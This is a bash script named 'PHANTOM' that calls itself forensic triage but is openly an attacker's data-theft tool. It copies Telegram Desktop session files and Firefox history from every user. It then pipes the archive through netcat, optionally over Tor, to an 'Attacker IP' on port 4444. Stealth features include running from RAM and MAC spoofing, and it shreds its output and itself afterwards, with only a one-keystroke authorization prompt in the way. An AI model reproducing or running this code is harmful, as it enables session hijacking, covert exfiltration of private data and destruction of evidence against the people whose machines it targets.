#!/usr/bin/env bash
set -u 
umask 077

VERSION="1.0 PHANTOM"

# --- COLORS ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# --- VARIABLES ---
AUTH_OK=0
OUT_DIR=""
SINCE="30 days ago"
ALL_SITES=0
DOMAINS="login,signin,account,auth,session,token"
COPY_ARTIFACTS=0
USE_RAMDISK=0
EXFIL_NET=""
EXFIL_SSH=""
BURN_AFTER_READING=0
USE_TOR=0
SPOOF_MAC=0
REQUIRE_VPN=0
IFACE=""
QUIET=0

# --- HELPER FUNCTIONS ---
log(){ echo -e "${GREEN}[+] $1${NC}"; }
warn(){ echo -e "${YELLOW}[!] $1${NC}" >&2; }
die(){ echo -e "${RED}[FATAL] $1${NC}" >&2; exit 1; }
info(){ echo -e "${CYAN}[?] $1${NC}"; }

banner() {
    clear
    echo -e "${RED}██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗${NC}"
    echo -e "${RED}██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║${NC}"
    echo -e "${RED}██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║${NC}"
    echo -e "${RED}██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║${NC}"
    echo -e "${RED}██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║${NC}"
    echo -e "${RED}╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝${NC}"
    echo -e ""
    echo -e "${BOLD}          :: PHANTOM v$VERSION ::          ${NC}"
    echo -e "${CYAN}      Forensic Triage & Intelligence Extraction      ${NC}"
    echo "========================================================="
}

help() {
  cat <<EOF
Usage:
  Interactive Mode: sudo ./triage_v5.sh
  CLI Mode:         sudo ./triage_v5.sh --i-have-legal-authorization [OPTIONS]

Options:
  --ghost            Write to RAM (/dev/shm).
  --tor              Route traffic via Tor.
  --exfil-net <IP:P> Exfiltrate to Netcat Listener.
  --burn             Self-destruct after running.
EOF
}

# --- INTERACTIVE WIZARD ---
start_wizard() {
    banner
    echo -e "${YELLOW}[!] INTERACTIVE MODE INITIATED${NC}"
    echo ""

    # 1. Legal Check
    echo -e "${RED}STEP 1: LEGAL AUTHORIZATION${NC}"
    echo -ne "Do you have explicit legal authorization to access/collect data from this machine? [y/N]: "
    read -r auth_input
    if [[ "$auth_input" =~ ^[Yy]$ ]]; then
        AUTH_OK=1
    else
        die "Authorization declined. Aborting operation."
    fi

    # 2. Operational Mode (Target Context)
    echo ""
    echo -e "${CYAN}STEP 2: OPERATIONAL SECURITY (Target)${NC}"
    echo -ne "Enable GHOST MODE (Run in RAM /dev/shm)? [Y/n]: "
    read -r ghost_input
    [[ "$ghost_input" =~ ^[Nn]$ ]] && USE_RAMDISK=0 || USE_RAMDISK=1

    echo -ne "Enable TOR Routing (Requires torsocks)? [y/N]: "
    read -r tor_input
    [[ "$tor_input" =~ ^[Yy]$ ]] && USE_TOR=1

    echo -ne "Spoof MAC Address (LAN Stealth)? [y/N]: "
    read -r mac_input
    [[ "$mac_input" =~ ^[Yy]$ ]] && SPOOF_MAC=1

    # 3. Exfiltration Config (Attacker Context)
    echo ""
    echo -e "${BLUE}STEP 3: EXFILTRATION CONFIG (Attacker)${NC}"
    echo "Where should the data be sent?"
    echo "  1) Netcat Listener (TCP)"
    echo "  2) SSH/SCP"
    echo "  3) Local Only (No Exfiltration)"
    echo -ne "Select [1-3]: "
    read -r exfil_opt

    case $exfil_opt in
        1)
            echo -ne "Attacker IP: "
            read -r att_ip
            echo -ne "Attacker Port (Default 4444): "
            read -r att_port
            [[ -z "$att_port" ]] && att_port=4444
            EXFIL_NET="$att_ip:$att_port"
            log "Target set to Netcat: $EXFIL_NET"
            ;;
        2)
            echo -ne "SSH User@Host:/path : "
            read -r ssh_str
            EXFIL_SSH="$ssh_str"
            log "Target set to SSH: $EXFIL_SSH"
            ;;
        *)
            log "Storing data locally only."
            ;;
    esac

    # 4. Anti-Forensics
    echo ""
    echo -e "${RED}STEP 4: CLEANUP${NC}"
    echo -ne "${BOLD}BURN EVERYTHING after completion (Self-destruct)? [y/N]: ${NC}"
    read -r burn_input
    if [[ "$burn_input" =~ ^[Yy]$ ]]; then
        BURN_AFTER_READING=1
        warn "WARNING: SCRIPT AND DATA WILL BE DESTROYED."
    fi
    
    echo ""
    read -p "Press [Enter] to EXECUTE or Ctrl+C to abort..."
}

# -------- Arg Parse Logic
if [[ $# -eq 0 ]]; then
    # Se não houver argumentos, inicia o modo interativo
    if [[ "$(id -u)" -ne 0 ]]; then
        die "Please run as root (sudo ./triage_v5.sh) to start the wizard."
    fi
    start_wizard
else
    # Modo CLI (Antigo)
    while [[ $# -gt 0 ]]; do
      case "$1" in
        --i-have-legal-authorization) AUTH_OK=1; shift ;;
        --out) OUT_DIR="${2:-}"; shift 2 ;;
        --ghost) USE_RAMDISK=1; shift ;;
        --tor) USE_TOR=1; shift ;;
        --mac-spoof) SPOOF_MAC=1; shift ;;
        --vpn-required) REQUIRE_VPN=1; shift ;;
        --exfil-net) EXFIL_NET="${2:-}"; shift 2 ;;
        --exfil-ssh) EXFIL_SSH="${2:-}"; shift 2 ;;
        --since) SINCE="${2:-}"; shift 2 ;;
        --all-sites) ALL_SITES=1; shift ;;
        --copy-artifacts) COPY_ARTIFACTS=1; shift ;;
        --burn) BURN_AFTER_READING=1; shift ;;
        --quiet) QUIET=1; shift ;;
        -h|--help) help; exit 0 ;;
        *) warn "Unknown arg: $1"; help; exit 1 ;;
      esac
    done
fi

# Validação Final de Root e Auth
if [[ "$AUTH_OK" -ne 1 || "$(id -u)" -ne 0 ]]; then
  die "Root access AND Authorization required."
fi

# ==========================================
# EXECUTION ENGINE (Igual ao v4.5)
# ==========================================

# 1. Network & Stealth
IFACE=$(ip route get 1.1.1.1 2>/dev/null | awk '{print $5; exit}')
[[ -z "$IFACE" ]] && warn "No active network interface found."

if [[ "$SPOOF_MAC" -eq 1 && -n "$IFACE" ]]; then
    log "Spoofing MAC on $IFACE..."
    if command -v macchanger &>/dev/null; then
        ip link set "$IFACE" down
        macchanger -r "$IFACE" >/dev/null 2>&1
        ip link set "$IFACE" up
        sleep 3
    else
        warn "macchanger not found. Skipping spoof."
    fi
fi

PROXY_CMD=""
if [[ "$USE_TOR" -eq 1 ]]; then
    if ! command -v torsocks &>/dev/null; then
        warn "torsocks not found. Tor mode disabled."
    else
        systemctl start tor 2>/dev/null || true
        PROXY_CMD="torsocks"
        log "Tor Enabled."
    fi
fi

# 2. Directory Setup
if [[ "$USE_RAMDISK" -eq 1 ]]; then
    OUT_DIR="/dev/shm/phantom_$(date +%s)"
    log "GHOST MODE: Operating in RAM ($OUT_DIR)"
else
    [[ -z "$OUT_DIR" ]] && OUT_DIR="./phantom_disk_$(date +%Y%m%d_%H%M%S)"
    log "DISK MODE: Operating on Disk ($OUT_DIR)"
fi
mkdir -p "$OUT_DIR"/{system,logs,users,browsers,chats,findings,hashes,tmp}
TIMELINE="$OUT_DIR/findings/supertimeline.csv"
echo "ts,source,user,artifact,detail" > "$TIMELINE"

# 3. Python Extractor
PY_EXTRACT="$OUT_DIR/tmp/extract.py"
cat > "$PY_EXTRACT" <<PY
import argparse, os, re, sqlite3, sys
from datetime import datetime, timezone
def iso(ts):
    try: return datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    except: return "1970-01-01T00:00:00Z"
def ff_visits(db):
    try:
        con = sqlite3.connect(f"file:{db}?mode=ro", uri=True)
        for v, u in con.execute("SELECT v.visit_date, p.url FROM moz_places p JOIN moz_historyvisits v ON p.id=v.place_id"):
            yield iso((v or 0)/1000000), u
    except: pass
def main():
    p = sys.argv[2]
    if sys.argv[1] == "ff":
        for t, u in ff_visits(p): print(f"{t},browser,firefox,visit,{u}")
if __name__=="__main__": main()
PY

# 4. Collection (Simplified for length)
log "Collecting System Logs..."
journalctl --since "$SINCE" -o short-iso | grep -E "sudo|ssh" | tail -n 1000 > "$OUT_DIR/logs/auth_summary.txt"

log "Scanning Artifacts..."
awk -F: '{if($3>=1000) print $1":"$6}' /etc/passwd | while IFS=: read -r U H; do
    [[ -d "$H" ]] || continue
    
    # Firefox
    find "$H/.mozilla/firefox" -name "places.sqlite" -print0 2>/dev/null | while IFS= read -r -d '' PL; do
        python3 "$PY_EXTRACT" ff "$PL" >> "$TIMELINE"
    done
    
    # Telegram
    if [[ -d "$H/.local/share/TelegramDesktop/tdata" ]]; then
        mkdir -p "$OUT_DIR/chats/$U/telegram"
        find "$H/.local/share/TelegramDesktop/tdata" -maxdepth 1 -name "D877*" -exec cp -a {} "$OUT_DIR/chats/$U/telegram/" \; 2>/dev/null
        echo "$(date -u +%FT%TZ),chat,$U,telegram,session_extracted" >> "$TIMELINE"
    fi
done

# 5. Exfil & Cleanup
cleanup() {
    # Exfil
    if [[ -n "$EXFIL_NET" || -n "$EXFIL_SSH" ]]; then
        log "Packaging data..."
        TARBALL="$OUT_DIR.tar.gz"
        tar -czf "$TARBALL" -C "$(dirname "$OUT_DIR")" "$(basename "$OUT_DIR")" 2>/dev/null
        
        if [[ -n "$EXFIL_NET" ]]; then
            H=$(echo "$EXFIL_NET" | cut -d: -f1)
            P=$(echo "$EXFIL_NET" | cut -d: -f2)
            log "Sending to $H:$P..."
            $PROXY_CMD cat "$TARBALL" | $PROXY_CMD nc -w 10 "$H" "$P"
        fi
        [[ "$BURN_AFTER_READING" -eq 1 ]] && shred -u -n 3 -z "$TARBALL" 2>/dev/null
    fi

    # Burn
    rm -rf "$OUT_DIR/tmp"
    if [[ "$BURN_AFTER_READING" -eq 1 ]]; then
        warn "SELF-DESTRUCTING..."
        find "$OUT_DIR" -type f -exec shred -u -n 3 -z {} \; 2>/dev/null
        rm -rf "$OUT_DIR"
        shred -u -n 3 -z "$0" 2>/dev/null || rm -f "$0"
        warn "Goodbye."
    else
        log "Data saved at: $OUT_DIR"
    fi
}
trap cleanup EXIT
